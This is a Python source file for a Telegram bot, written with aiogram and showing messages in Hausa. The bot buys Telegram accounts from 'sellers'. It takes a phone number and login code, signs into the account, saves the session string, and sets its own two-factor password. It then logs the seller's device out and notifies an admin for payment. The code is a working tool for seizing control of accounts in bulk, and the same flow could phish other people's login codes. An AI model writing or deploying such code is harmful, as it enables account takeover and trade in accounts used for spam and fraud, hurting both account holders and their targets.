import asyncio
from datetime import datetime
from aiogram import Router, types, F
from aiogram.fsm.context import FSMContext

from handlers.phone_handler import PhoneStates
from database import (
    get_pending_submission, 
    move_to_verified, 
    move_to_unverified,
    add_admin_notification
)
from services.telegram_client import login_with_otp
from services.account_manager import setup_2fa_and_logout
from config import ADMIN_ID

router = Router()

@router.message(PhoneStates.waiting_for_otp, F.text.regexp(r'^\d{5,6}$'))
async def otp_handler(message: types.Message, state: FSMContext):
    """Handle OTP submission"""
    
    otp = message.text.strip()
    state_data = await state.get_data()
    phone_number = state_data.get('phone_number')
    
    if not phone_number:
        await message.answer(
            "❌ <b>Kuskure!</b>\n\n"
            "Don Allah ka fara daga farko da /start"
        )
        await state.clear()
        return
    
    # Check if submission is still pending (not timed out)
    pending = await get_pending_submission(message.from_user.id)
    if not pending:
        await message.answer(
            "⏰ <b>Lokaci ya ƙare!</b>\n\n"
            "Account din ya zama 'unverified'. Ka iya sake tura lambar waya don sake gwadawa."
        )
        await state.clear()
        return
    
    # Check timeout
    timeout_at = datetime.fromisoformat(pending[1])
    if datetime.now() > timeout_at:
        await move_to_unverified(message.from_user.id, phone_number)
        await message.answer(
            "⏰ <b>Lokaci ya ƙare!</b>\n\n"
            "Account din ya zama 'unverified'. Ka iya sake tura lambar waya don sake gwadawa."
        )
        await state.clear()
        return
    
    # Show processing message
    processing_msg = await message.answer(
        "🔄 <b>Ana shiga account...</b>\n\n"
        "Don Allah a jira..."
    )
    
    try:
        # Attempt to login with OTP
        client, session_string = await login_with_otp(phone_number, otp)
        
        if not client:
            await processing_msg.edit_text(
                "❌ <b>Kuskure a shiga account!</b>\n\n"
                "OTP ba daidai ba ne ko kuna da kuskure.\n"
                "Ka iya sake tura lambar waya don sake gwadawa."
            )
            await move_to_unverified(message.from_user.id, phone_number)
            await state.clear()
            return
        
        # Update processing message
        await processing_msg.edit_text(
            "🔄 <b>Ana saita tsaro...</b>\n\n"
            "Ana saita 2FA da cire account daga na'urar ka..."
        )
        
        # Setup 2FA and logout from seller's device
        success = await setup_2fa_and_logout(client, session_string)
        
        if success:
            # Move to verified
            await move_to_verified(message.from_user.id, phone_number, session_string)
            
            # Send admin notification (ONLY for verified accounts)
            await send_admin_notification(message.from_user.id, phone_number, message.from_user.username)
            
            # Add to admin notifications log
            await add_admin_notification(message.from_user.id, phone_number, "verified_account")
            
            # Success message to seller
            await processing_msg.edit_text(
                "✅ <b>An shiga account din ku cikin nasara!</b>\n\n"
                "📱 <b>Lambar:</b> <code>" + phone_number + "</code>\n"
                "🔐 <b>Tsaro:</b> An saita 2FA\n"
                "📤 <b>Status:</b> Verified\n\n"
                "Ka cire account din daga na'urar ka yanzu.\n"
                "Za a biya ku bisa ga adadin account din da kuka kawo.\n\n"
                "⏰ <b>Ana biyan kuɗi daga karfe 8:00 na dare (WAT) zuwa gaba.</b>\n"
                "Don Allah ka shirya tura bukatar biya ta /withdraw."
            )
            
        else:
            await processing_msg.edit_text(
                "❌ <b>Kuskure a saita tsaro!</b>\n\n"
                "An shiga account amma ba a iya saita 2FA ba.\n"
                "Ka iya sake tura lambar waya don sake gwadawa."
            )
            await move_to_unverified(message.from_user.id, phone_number)
            
    except Exception as e:
        await processing_msg.edit_text(
            "❌ <b>Kuskure a shiga account!</b>\n\n"
            "An sami matsala. Ka iya sake tura lambar waya don sake gwadawa.\n\n"
            f"<i>Kuskure: {str(e)}</i>"
        )
        await move_to_unverified(message.from_user.id, phone_number)
    
    await state.clear()

async def send_admin_notification(user_id, phone_number, username):
    """Send notification to admin for verified accounts only"""
    from main import bot
    
    try:
        notification = (
            "🔔 <b>SABON VERIFIED ACCOUNT!</b>\n\n"
            f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🆔 <b>Username:</b> @{username or 'N/A'}\n"
            f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
            f"⏰ <b>Lokaci:</b> {datetime.now().strftime('%H:%M:%S WAT')}\n\n"
            f"💡 <b>Don karɓa:</b> /accept {user_id} {phone_number}"
        )
        
        await bot.send_message(ADMIN_ID, notification)
        
    except Exception as e:
        print(f"Error sending admin notification: {e}")

# Handle timeout for pending submissions
@router.message(PhoneStates.waiting_for_otp)
async def invalid_otp_handler(message: types.Message, state: FSMContext):
    """Handle invalid OTP or other messages while waiting for OTP"""
    
    if message.text == "/cancel":
        # This will be handled by the cancel handler
        return
    
    await message.answer(
        "❌ <b>OTP ba daidai ba ne!</b>\n\n"
        "Don Allah turo lambar sirri mai lamba 5-6.\n"
        "Misali: 12345 ko 123456\n\n"
        "💡 <i>Za ka iya amfani da /cancel don soke aikin</i>"
      )
